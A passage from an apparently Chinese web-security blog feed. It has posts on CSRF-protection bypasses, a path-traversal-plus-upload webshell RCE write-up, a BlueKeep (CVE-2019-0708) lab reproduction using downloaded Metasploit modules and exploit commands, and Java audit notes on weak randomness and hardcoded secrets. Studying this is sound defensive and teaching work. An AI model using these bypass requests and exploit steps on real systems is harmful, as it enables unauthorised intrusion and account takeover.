所有的CSRF</span></h3><ul><li>不管哪种CSRF防御措施部署，你都可以先尝试如下两件事：点击劫持和更改请求方法。</li></ul><h4><span id="211-点击劫持">2.1.1 点击劫持</span></h4><ul><li>在同一个功能端点利用点击劫持会绕过所有CSRF防御。因为从技术上讲，请求确实来自合法站点，如果易受攻击的端点所在页面容易遭受点击劫持攻击，那么所有的CSRF保护将变得没有效果，攻击者可以任意执行CSRF攻击。</li></ul><h4><span id="212-更改请求方法">2.1.2 更改请求方法</span></h4><ul><li>另外值得一试的方法就是更改请求的方法。如果要伪造的敏感请求是通过POST方法发送的，那么尝试将其转换为GET请求。如果操作时通过GET方法发送的，那么尝试转换为POST方法。应用程序可能仍然执行操作，且通常没有任何保护机制。</li></ul><ul><li>例如，如下请求：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty</span><br><span class="line">可以被改写成</span><br><span class="line"></span><br><span class="line">GET /change_password?new_password=qwerty</span><br></pre></td></tr></table></figure><h2><span id="三-csrf-token的防御措施">三 、CSRF token的防御措施</span></h2><ul><li>因为一个站点使用了CSRF token不代表这个token是有效验证对应请求操作的，可以尝试如下方法绕过CSRF的token保护。</li></ul><h3><span id="31-删除token参数或发送空token">3.1 删除token参数或发送空token</span></h3><ul><li><p>不发送token也可以正常请求数据是因为这种逻辑错误在应用程序中非常常见：应用程序有时会在token存在的时候或者token参数不为空的时候检查token的有效性。这种情况下，如果一个请求不包含token或者token值为空，那么也是有可能绕过CSRF的防御的。</p></li><li><p>例如，合法请求如下</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b</span><br><span class="line">那么实施这种请求：</span><br><span class="line"></span><br><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty</span><br><span class="line">或这种：</span><br><span class="line"></span><br><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty&amp;csrf_tok=</span><br></pre></td></tr></table></figure><h3><span id="32-使用另一个session的csrf-token">3.2 使用另一个session的CSRF token</span></h3><ul><li><p>应用程序可能只是检查token是否合法，但是不检查token是否确实归属于当前用户。如果是这种情况的话，你可以在payload中硬编码一个合法有效的token即可。</p></li><li><p>如果一个受害者的token是871caef0757a4ac9691aceb9aad8b65b，你自己的token是YOUR_TOKEN，那么你可以很容易获取到自己的token但很难获取到受害者的token。尝试在payload中提供自己的token来绕过CSRF防御。</p></li><li><p>换句话说，原本应该发送如下请求：</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b</span><br><span class="line">但是改成发送这个请求：</span><br><span class="line"></span><br><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=YOUR_TOKEN</span><br></pre></td></tr></table></figure><h3><span id="33-session固定">3.3 Session固定</span></h3><ul><li><p>有时候站点使用一个双提交cookie作为一个CSRF的防御措施。这个表明这个请求需要包含一个cookie，其值为随机token值，且同时在请求参数中也有一个字段值为该随机token值。如果值相同，那么请求是合法的。这种防御形式是非常常见的。</p></li><li><p>如果一个双提交cookie用在了防御措施中，那么这个应用有可能没有将有效的token保存在服务器端。所以它没有办法指定token是否合法，并且也有可能很少检查cookie中的token值和参数中token值是不是一样的。这代表你可以发送一个假token，然后仍然可以有效实施CSRF攻击。</p></li><li><p>这种攻击包含两个步骤：第一步，你使用一个session固定技术去确认受害者的浏览器使用的是你提供的包含假token的session，然后第二步在参数中使用同一个token来执行这个CSRF攻击。</p></li><li><p>session固定。这是一个可以让你控制受害者的cookie存储的攻击；</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">执行如下请求来实施CSRF攻击</span><br><span class="line"></span><br><span class="line">POST /change_password</span><br><span class="line">Cookie: CSRF_TOK=FAKE_TOKEN;</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=FAKE_TOKEN</span><br></pre></td></tr></table></figure><h3><span id="34-通过xss获取csrf_token">3.4 通过XSS获取csrf_token</span></h3><ul><li>前提是网站不存在XSS漏洞或者CSRF-Token具备httponly属性</li></ul><h3><span id="35-jsonp劫持获取csrf_token">3.5 Jsonp劫持获取csrf_token</span></h3><ul><li><a href="https://www.jianshu.com/p/1cda296cf7d2" target="_blank" rel="noopener">https://www.jianshu.com/p/1cda296cf7d2</a></li></ul><h2><span id="四-referer字段的csrf防御">四、 Referer字段的CSRF防御</span></h2><ul><li>如果attack.com是一个可控的域名，bank.com是一个要攻击的域名。这个站点没有使用CSRF token但是检查了referer字段。你应该怎么做？</li></ul><h3><span id="41-referer值为空或移除referer字段">4.1 Referer值为空或移除referer字段</span></h3><ul><li>首先，我们对空Referer的定义为，Referer 头部的内容为空，或者，一个HTTP请求中根本不包含Referer头部</li><li>和发送一个空token值相同，有时候你只需简单地移除referer字段就可以绕过CSRF防御。你可以添加如下meta标签到存在漏洞的页面。</li><li>扩展测试面：例如jsonp劫持</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</span><br><span class="line">或</span><br><span class="line">&lt;meta name =&quot;referrer&quot; content =&quot;no-referrer&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>应用程序可能只是在发送后才会验证，这种情况下你可以绕过其CSRF防御。</li></ul><h3><span id="42-自建服务器路径带referer字段名">4.2 自建服务器路径带referer字段名</span></h3><ul><li><p>原理就是在路径上创建成原本referer中有的字段名，如果校验只是判断是否包含。<br>  <a href="https://imgchr.com/i/MGC6pV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/13/MGC6pV.md.jpg" alt="MGC6pV.md.jpg"></a></p><ul><li>案例：<br>  <a href="https://www.zybuluo.com/1kbfree/note/1210937" target="_blank" rel="noopener">https://www.zybuluo.com/1kbfree/note/1210937</a></li></ul></li></ul><h3><span id="43-利用url跳转">4.3 利用URL跳转</span></h3><ul><li>案例：<br>  <a href="https://www.zybuluo.com/1kbfree/note/1239095" target="_blank" rel="noopener">https://www.zybuluo.com/1kbfree/note/1239095</a></li></ul><h3><span id="43-绕过正则表达式">4.3 绕过正则表达式</span></h3><ul><li><p>如果referer检查是基于白名单的，你可以尝试绕过验证URL的正则表达式。例如，你可以尝试在referer的URL中将受害者域名置于二级域名区域或者URL目录区域。</p></li><li><p>如果一个站点在referer字段检查“bank.com”字段，那么“bank.com.attacker.com”或”attakcer.com/bank.com”可能可以绕过这种检测。</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#一-先了解下csrf_token&quot;&gt;一、 先了解下CSRF_TOKEN&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-什么是csrf_token&quot;&gt;1. 什么是CSRF_TOKEN&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="前端安全-CSRF" scheme="http://www.vkxss.top/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-CSRF/"/>
    
  </entry>
  
  <entry>
    <title>路径遍历的RCE</title>
    <link href="http://www.vkxss.top/2019/09/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E7%9A%84RCE/"/>
    <id>http://www.vkxss.top/2019/09/10/渗透测试-路径遍历的RCE/</id>
    <published>2019-09-10T07:30:08.000Z</published>
    <updated>2019-11-12T08:04:54.794Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-路径遍历的rce">0x00 路径遍历的RCE</a></li></ul><!-- tocstop --><h2><span id="0x00-路径遍历的rce">0x00 路径遍历的RCE</span></h2><ul><li><p>如下是利用目录遍历，配合文件上传漏洞的一个RCE的记录。</p></li><li><p>条件：</p><ul><li>存在目录遍历漏洞</li><li>存在文件上传漏洞<ul><li>已知上传的路径，无访问权限的情况</li></ul></li></ul></li><li><p>首先，在浏览时，我发现一个引起我注意的参数，frameManagerPath是base64参数。此路径始终返回javascript代码。就像下面的图像：<br><a href="https://imgchr.com/i/M3pyH1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/12/M3pyH1.jpg" alt="M3pyH1.jpg"></a></p></li><li><p>解码该值后，我可以注意到该值是文件的相对路径。<br><a href="https://imgchr.com/i/M3pBjJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/12/M3pBjJ.jpg" alt="M3pBjJ.jpg"></a></p></li><li><p>接下来，步骤是将字符串/ etc / passwd编码为base64格式，以尝试遍历某些路径，令我惊讶的是:)。OBS：L2V0Yy9wYXNzd2Q = == / etc / passwd<br><a href="https://imgchr.com/i/M3CAot" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/12/M3CAot.jpg" alt="M3CAot.jpg"></a></p></li></ul><ul><li><p>但是，在找到该路径遍历之前，我发现了一个上传错误的文件，使我能够上传 任何类型的文件，但是我无法访问/ wwwroot / path：/中的根目录。下图显示了此文件上传的请求和响应。<br><a href="https://imgchr.com/i/M3p0c4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/12/M3p0c4.jpg" alt="M3p0c4.jpg"></a></p></li><li><p>下一步，我将显示一个Webshel​​l，如下所示。</p></li><li><p>通过将这两个项目结合在一起，可以通过路径遍历访问webshel​​l，并通过webshel​​l在服务器上执行命令。cmFudC9ibG9nL3BhdGh0cmF2ZXJzYWwvaW1hZ2UwNS5wbmc = ==“路径wwwroot编码为em base64（模糊）”</p></li><li><p>请求</p></li></ul><p><a href="https://imgchr.com/i/M3CVFP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/12/M3CVFP.jpg" alt="M3CVFP.jpg"></a></p><ul><li><p>响应<br><a href="https://imgchr.com/i/M3psBR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/12/M3psBR.jpg" alt="M3psBR.jpg"></a></p></li><li><p>下一个图像说明了最终结果。<br><a href="https://imgchr.com/i/M3pgN6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/12/M3pgN6.jpg" alt="M3pgN6.jpg"></a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-路径遍历的rce&quot;&gt;0x00 路径遍历的RCE&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;

&lt;h2&gt;&lt;span id=&quot;0x00-路径遍历的rce&quot;&gt;0x00 路径遍历的RCE&lt;/s
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708 远程桌面代码执行漏洞复现</title>
    <link href="http://www.vkxss.top/2019/09/07/CVE-2019-0708/"/>
    <id>http://www.vkxss.top/2019/09/07/CVE-2019-0708/</id>
    <published>2019-09-07T07:30:08.000Z</published>
    <updated>2019-09-20T02:01:32.249Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-简介">0X00 简介</a></li><li><a href="#0x01-环境准备">0X01 环境准备</a></li><li><a href="#0x02-漏洞复现">0x02 漏洞复现</a></li><li><a href="#0x03-漏洞检测修复工具批量快速扫描检测工具热补丁工具">0x03 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具</a></li></ul><!-- tocstop --><h1><span id="0x00-简介">0X00 简介</span></h1><ul><li><p><font face="微软雅黑">Microsoft Windows是美国微软公司发布的视窗操作系统。远程桌面连接是微软从Windows 2000 Server开始提供的功能组件。</font></p></li><li><p><font face="微软雅黑">2019年5月14日，微软发布了月度安全更新补丁，修复了远程桌面协议（RDP）远程代码执行漏洞。未经身份验证的攻击者利用该漏洞，向目标 Windows主机发送恶意构造请求，可以在目标系统上执行任意代码。</font></p></li><li><p><font face="微软雅黑">近日，Metasploit发布了该漏洞的利用模块，GitHub网站上也公开了该漏洞的利用代码，引起了安全研究人员的广泛关注。目前该漏洞利用仅对Windows 7 SP1 x64与Windows 2008 R2 x64（非系统默认配置）系统版本有效，在虚拟机环境下复现成功。</font></p></li></ul><h1><span id="0x01-环境准备">0X01 环境准备</span></h1><ul><li><font face="微软雅黑">攻击机:kali</font></li><li><font face="微软雅黑">靶机：Win7</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows7 SP1下载链接</span><br><span class="line">ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</span><br></pre></td></tr></table></figure><h1><span id="0x02-漏洞复现">0x02 漏洞复现</span></h1><ul><li><font face="微软雅黑">msf必须使用msf5（#msfupdate）</font></li><li><font face="微软雅黑">下载exp:<br><font face="微软雅黑">kali攻击机下载metasploit攻击脚本，kali中执行以下命令</font></font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure><p><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hf34b7902d9a74301be767557b04a35cdq.jpg" style="zoom:30%"></center><br><font face="微软雅黑"><center>图：下载攻击载荷</center></font></font></p><ul><li><font face="微软雅黑">做如下替换（大部分人msf都装在如下位置）</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rdp.rb -&gt; </span><br><span class="line">/usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line">rdp_scanner.rb -&gt; </span><br><span class="line">/usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">cve_2019_0708_bluekeep.rb -&gt; </span><br><span class="line">/usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">cve_2019_0708_bluekeep_rce.rb -&gt; </span><br><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">做如下替换（我的位置）</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rdp.rb -&gt; </span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line">rdp_scanner.rb -&gt; </span><br><span class="line">/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">cve_2019_0708_bluekeep.rb -&gt; </span><br><span class="line">/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">cve_2019_0708_bluekeep_rce.rb -&gt; </span><br><span class="line">/opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">reload_all 重新加载所有的模块，将新添加的模块加载上。成功如下图：</font></li></ul><p><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hc7c188bf9d2a4e88957191a666d72664d.jpg" style="zoom:30%"></center><br><font face="微软雅黑"><center>图：成功加载攻击载荷</center></font></font></p><ul><li><font face="微软雅黑">使用攻击载荷</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; use exploit/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">&gt; set rhosts 靶机IP</span><br><span class="line">&gt; set target 3 （根据靶机而定）</span><br><span class="line">&gt; exploit</span><br></pre></td></tr></table></figure><p><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Ha677c5104fc84a6d8274518d5564febfs.jpg" style="zoom:40%"></center></font></p><ul><li>成功利用！！！！</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; set target 3</span><br></pre></td></tr></table></figure><p><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H74b9edc3a44c4bdfbe94779a9cee8705Z.jpg" style="zoom:50%"></center><br><font face="微软雅黑"><center>图：蓝屏</center></font></font></p><ul><li>再来一次！！！！</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; set target 1</span><br></pre></td></tr></table></figure><p><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H274ef8c81712437ebfa26f2e12366427P.jpg" style="zoom:50%"></center><br><font face="微软雅黑"><center>图：会话</center></font></font></p><h1><span id="0x03-漏洞检测修复工具amp批量快速扫描检测工具amp热补丁工具">0x03 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具</span></h1><ul><li><font face="微软雅黑">下载页面：</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.qianxin.com/other/CVE-2019-0708</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">使用说明：</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;下载文件进行解压。</span><br><span class="line">&gt;使用win+R快捷键或开始菜单选择“运行”，输入cmd。调起命令行工具。</span><br><span class="line">&gt;在命令行工具，执行命令到工具所在文件夹</span><br><span class="line">&gt;输入命令对应功能，启用热补丁命令：QKShield.exe /enable ；禁用热补丁命令：QKShield.exe/disable 。</span><br><span class="line">&gt;重启系统后，需要重新运行命令行来启用热补丁</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">实现效果：</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">在工具支持的系统中启用热补丁后，用漏洞扫描工具扫描结果为没有漏洞。漏洞扫描工具下载地址：https://www.qianxin.com/other/CVE-2019-0708</span><br><span class="line">支持系统：</span><br><span class="line">Windows XP for 32-bit Systems Service Pack 3</span><br><span class="line">Windows 7 for 32-bit Systems</span><br><span class="line">Windows 7 for x64-based Systems</span><br><span class="line">Windows 7 for 32-bit Systems Service Pack 1</span><br><span class="line">Windows 7 for x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2003 for 32-bit Systems Service Pack 2</span><br><span class="line">Windows Server 2003 R2 for 32-bit Systems Service Pack2</span><br><span class="line">Windows Server 2008 for 32-bit Systems Service Pack 2</span><br><span class="line">Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)</span><br><span class="line">Windows Server 2008 for x64-based Systems Service Pack2</span><br><span class="line">Windows Server 2008 for x64-based Systems Service Pack2 (Server Core installation)</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems ServicePack 1</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems ServicePack 1 (Server Core installation)</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">暂不支持的系统：</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2003 for x64-based Systems Service Pack2</span><br><span class="line">Windows Server 2008 for Itanium-Based Systems ServicePack 2</span><br><span class="line">Windows Server 2008 R2 for Itanium-Based SystemsService Pack 1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-简介&quot;&gt;0X00 简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-环境准备&quot;&gt;0X01 环境准备&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-漏洞复现&quot;&gt;0x02 漏洞复现&lt;/a
      
    
    </summary>
    
    
      <category term="CVE-2019" scheme="http://www.vkxss.top/categories/CVE-2019/"/>
    
    
      <category term="CVE-2019-0708" scheme="http://www.vkxss.top/tags/CVE-2019-0708/"/>
    
  </entry>
  
  <entry>
    <title>Insecure Randomness</title>
    <link href="http://www.vkxss.top/2019/08/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Insecure%20Randomness/"/>
    <id>http://www.vkxss.top/2019/08/22/代码审计-Insecure Randomness/</id>
    <published>2019-08-22T06:10:40.000Z</published>
    <updated>2019-11-19T06:38:29.828Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#1-insecure-randomness">1、Insecure Randomness</a><ul><li><a href="#11-描述">1.1、描述：</a></li><li><a href="#12-审计方法">1.2、审计方法：</a></li><li><a href="#13-漏洞示例">1.3、漏洞示例:</a></li><li><a href="#14-漏洞危害">1.4、漏洞危害：</a></li><li><a href="#15-修复方案">1.5、修复方案：</a></li></ul></li></ul><!-- tocstop --><h1><span id="1-insecure-randomness">1、Insecure Randomness</span></h1><h2><span id="11-描述">1.1、描述：</span></h2><ul><li><font face="微软雅黑">伪随机数生成器（PRNG）使用确定性数学算法来产生具有良好统计属性的数字序列。但是这种数字序列并不具有真正的随机特性。伪随机数生成器通常以一个算术种子值为起始。算法使用该种子值生成一个输出以及一个新的种子，这个种子又被用来生成下一个随机值，以此类推。<br>Java API 提供了伪随机数生成器（PRNG）—— java.util.Random类。这个伪随机数生成器具有可移植性和可重复性。因此，如果两个java.util.Random类的实例创建时使用的是相同的种子值，那么对于所有的Java实现，它们将生成相同的数字序列。在系统重启或应用程序初始化时，Seed值总是被重复使用。在一些其他情况下，seed值来自系统时钟的当前时间。攻击者可以在系统的一些安全脆弱点上监听，并构建相应的查询表预测将要使用的seed值。</font></li></ul><h2><span id="12-审计方法">1.2、审计方法：</span></h2><ul><li><p><font face="微软雅黑">全局搜索以下关键词</font></p><p>  <font face="微软雅黑">“random”</font></p></li></ul><h2><span id="13-漏洞示例">1.3、漏洞示例:</span></h2><ul><li><font face="微软雅黑">例如在易于猜测的密码、可预测的加密密钥、验证码生成、抽奖活动、UUID生成、SessionID生成、Token生成、CSRF Token、找回密码Token、游戏（随机元素的生成）、密码应用场景、生成密钥：对称密码，消息认证、生成密钥对：公钥密码，数字签名、生成IV： 用于分组密码的CBC，CFB和OFB模式、生成nonce: 用于防御重放攻击; 分组密码的CTR模式、生成盐：用于基于口令的密码PBE等，可能会降低系统安全性。<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H0a6d84344a8a4831973a1a50706be5ecy.png" style="zoom:30%"></center></font></font></li></ul><p><font face="微软雅黑"><center>图1：漏洞代码</center></font></p><h2><span id="14-漏洞危害">1.4、漏洞危害：</span></h2><ul><li><font face="微软雅黑">生成的随机数很容易预测，可能会降低系统安全性。</font></li></ul><h2><span id="15-修复方案">1.5、修复方案：</span></h2><ul><li><font face="微软雅黑">因此，java.util.Random类不能用于安全敏感应用或者敏感数据保护。应使用更加安全的随机数生成器，例如java.security.SecureRandom类。<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H828ae4843a814538b5321ebcc13276f1N.png" style="zoom:30%"></center></font></font></li></ul><p><font face="微软雅黑"><center>图2：修复代码</center></font></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-insecure-randomness&quot;&gt;1、Insecure Randomness&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-描述&quot;&gt;1.1、描述：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#12
      
    
    </summary>
    
    
      <category term="JAVA" scheme="http://www.vkxss.top/categories/JAVA/"/>
    
    
      <category term="Java代码审计" scheme="http://www.vkxss.top/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>敏感信息硬编码在程序中</title>
    <link href="http://www.vkxss.top/2019/08/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%A1%AC%E7%BC%96%E7%A0%81%E5%9C%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD/"/>
    <id>http://www.vkxss.top/2019/08/22/代码审计-敏感信息硬编码在程序中/</id>
    <published>2019-08-22T04:25:40.000Z</published>
    <updated>2019-12-02T09:32:25.144Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#1-敏感信息硬编码在程序中">1、敏感信息硬编码在程序中</a><ul><li><a href="#11-描述">1.1、描述：</a></li><li><a href="#12-审计方法">1.2、审计方法：</a></li><li><a href="#13-漏洞示例">1.3、漏洞示例:</a></li><li><a href="#14-漏洞危害">1.4、漏洞危害：</a></li><li><a href="#15-修复方案">1.5、修复方案：</a></li></ul></li></ul><!-- tocstop --><h1><span id="1-敏感信息硬编码在程序中">1、敏感信息硬编码在程序中</span></h1><h2><span id="11-描述">1.1、描述：</span></h2><ul><li><font face="微软雅黑">如果将敏感信息（包括口令和加密密钥）硬编码在程序中，可能会将敏感信息暴露给攻击者。任何能够访问到class文件的人都可以反编译class文件并发现这些敏感信息。因此，不能将信息硬编码在程序中。同时，硬编码敏感信息会增加代码管理和维护的难度。</font></li></ul><h2><span id="12-审计方法">1.2、审计方法：</span></h2><ul><li><p><font face="微软雅黑">全局搜索以下关键词</font></p><p>  <font face="微软雅黑">“password”</font></p></li></ul><h2><span id="13-漏洞示例">1.3、漏洞示例:</span></h2><ul><li><font face="微软雅黑">恶意用户可以使用javap -c IPaddress命令来反编译class来发现其中硬编码的服务器IP地址。反编译器的输出信息透露了服务器的明文IP地址：172.16.254.1。</font><br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H275d6113fe3d434284c6321eb4f9bf92C.png" style="zoom:30%"></center></font></li></ul><p><font face="微软雅黑"><center>图1：错误代码</center></font></p><h2><span id="14-漏洞危害">1.4、漏洞危害：</span></h2><ul><li><font face="微软雅黑">很容易被攻击者利用，导致系统敏感信息泄露。</font></li></ul><h2><span id="15-修复方案">1.5、修复方案：</span></h2><ul><li><font face="微软雅黑">敏感信息存放在配置文件或数据库中并加密存储。(金融行业安全系数更高)</font></li><li><font face="微软雅黑">这个正确代码示例从一个安全目录下的外部文件获取服务器IP地址。并在其使用完后立即从内存中将其清除可以防止后续的信息泄露。<br><font face="微软雅黑"><center><img 